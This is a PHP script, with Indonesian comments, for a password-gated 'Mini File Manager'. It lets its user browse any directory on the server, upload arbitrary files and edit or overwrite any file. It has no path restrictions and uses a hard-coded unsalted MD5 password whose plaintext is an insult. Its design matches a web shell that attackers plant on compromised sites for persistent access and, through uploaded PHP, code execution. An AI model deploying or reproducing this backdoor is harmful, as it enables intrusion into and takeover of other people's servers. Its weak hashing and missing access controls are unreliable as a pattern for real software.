<?php
session_start();

// Hash MD5 dari 'lu babu'
$password_hash = 'c6a20bcf3ef78a1541ad23598cb295c8';

// Proses Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    unset($_SESSION['logged_in']);
    header('Location: ' . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// Proses Login
$error = '';
if (isset($_POST['password'])) {
    if (md5($_POST['password']) === $password_hash) {
        $_SESSION['logged_in'] = true;
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        $error = 'Password salah!';
    }
}

// Tampilkan Form Login jika belum terautentikasi
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Login - Mini File Manager</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #fff; padding: 20px 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
        input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #007bff; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
        .error { color: red; font-size: 14px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h3>Protected Area</h3>
        <?php if ($error): ?><div class="error"><?= $error ?></div><?php endif; ?>
        <form method="POST">
            <input type="password" name="password" placeholder="Masukkan Password" required autofocus>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

// --- LOGIKA FILE MANAGER --- //

// Tentukan direktori kerja saat ini
$dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
$dir = realpath($dir);

// Validasi jika direktori tidak ditemukan
if (!$dir || !is_dir($dir)) {
    $dir = __DIR__;
}

$dir = str_replace('\\', '/', $dir); // Normalisasi path Windows/Linux

// 1. Fitur Upload File
$msg = '';
if (isset($_FILES['upload_file'])) {
    $target = $dir . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_filename'] ?? $_FILES['upload_file']['tmp_name'], $target)) {
        $msg = "File berhasil diunggah!";
    } else {
        $msg = "Gagal mengunggah file.";
    }
}

// 2. Fitur Edit / Simpan File
if (isset($_POST['save_file']) && isset($_POST['filename'])) {
    $file_path = $dir . '/' . basename($_POST['filename']);
    if (file_put_contents($file_path, $_POST['file_content']) !== false) {
        $msg = "File berhasil disimpan!";
    } else {
        $msg = "Gagal menyimpan file.";
    }
}

// Tampilan Edit File
$edit_mode = false;
$edit_filename = '';
$edit_content = '';
if (isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['file'])) {
    $file_path = $dir . '/' . basename($_GET['file']);
    if (is_file($file_path)) {
        $edit_mode = true;
        $edit_filename = $_GET['file'];
        $edit_content = htmlspecialchars(file_get_contents($file_path));
    }
}

// Ambil daftar file & folder
$items = array_diff(scandir($dir), array('.', '..'));
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Mini File Manager</title>
    <style>
        body { font-family: monospace, sans-serif; background: #f8f9fa; margin: 20px; color: #333; }
        .container { background: #fff; padding: 20px; border-radius: 6px; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ddd; padding-bottom: 10px; margin-bottom: 15px; }
        .path-bar { display: flex; gap: 5px; margin-bottom: 15px; }
        .path-bar input[type="text"] { flex: 1; padding: 6px 10px; font-family: inherit; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #ddd; }
        th { background: #eee; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .btn { background: #28a745; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; }
        .btn-danger { background: #dc3545; }
        .alert { background: #e2e3e5; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
        textarea { width: 100%; height: 300px; font-family: monospace; margin-top: 10px; padding: 10px; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h2>Mini File Manager</h2>
        <a href="?action=logout" class="btn btn-danger">Logout</a>
    </div>

    <?php if ($msg): ?>
        <div class="alert"><?= $msg ?></div>
    <?php endif; ?>

    <!-- Navigasi Jump Direktori -->
    <form method="GET" class="path-bar">
        <label style="line-height: 30px;"><strong>Current Dir:</strong></label>
        <input type="text" name="dir" value="<?= htmlspecialchars($dir) ?>" required>
        <button type="submit" class="btn">Go</button>
    </form>

    <?php if ($edit_mode): ?>
        <!-- Form Edit File -->
        <h3>Editing File: <?= htmlspecialchars($edit_filename) ?></h3>
        <form method="POST" action="?dir=<?= urlencode($dir) ?>">
            <input type="hidden" name="filename" value="<?= htmlspecialchars($edit_filename) ?>">
            <textarea name="file_content"><?= $edit_content ?></textarea><br><br>
            <button type="submit" name="save_file" class="btn">Simpan File</button>
            <a href="?dir=<?= urlencode($dir) ?>" class="btn btn-danger">Batal</a>
        </form>
    <?php else: ?>
        <!-- Form Upload File -->
        <form method="POST" enctype="multipart/form-data" style="margin-bottom: 20px;">
            <input type="file" name="upload_file" required>
            <button type="submit" class="btn">Upload File</button>
        </form>

        <!-- Tabel File & Folder -->
        <table>
            <thead>
                <tr>
                    <th>Nama</th>
                    <th>Tipe</th>
                    <th>Ukuran</th>
                    <th>Aksi</th>
                </tr>
            </thead>
            <tbody>
                <!-- Link Kembali/Up Directory -->
                <tr>
                    <td><a href="?dir=<?= urlencode(dirname($dir)) ?>">📁 .. (Up Directory)</a></td>
                    <td>Folder</td>
                    <td>-</td>
                    <td>-</td>
                </tr>
                <?php foreach ($items as $item): 
                    $full_path = $dir . '/' . $item;
                    $is_dir = is_dir($full_path);
                ?>
                <tr>
                    <td>
                        <?php if ($is_dir): ?>
                            <a href="?dir=<?= urlencode($full_path) ?>">📁 <?= htmlspecialchars($item) ?></a>
                        <?php else: ?>
                            📄 <?= htmlspecialchars($item) ?>
                        <?php endif; ?>
                    </td>
                    <td><?= $is_dir ? 'Folder' : 'File' ?></td>
                    <td><?= $is_dir ? '-' : number_format(filesize($full_path)) . ' Bytes' ?></td>
                    <td>
                        <?php if (!$is_dir): ?>
                            <a href="?dir=<?= urlencode($dir) ?>&action=edit&file=<?= urlencode($item) ?>">Edit</a>
                        <?php else: ?>
                            -
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    <?php endif; ?>
</div>

</body>
</html>
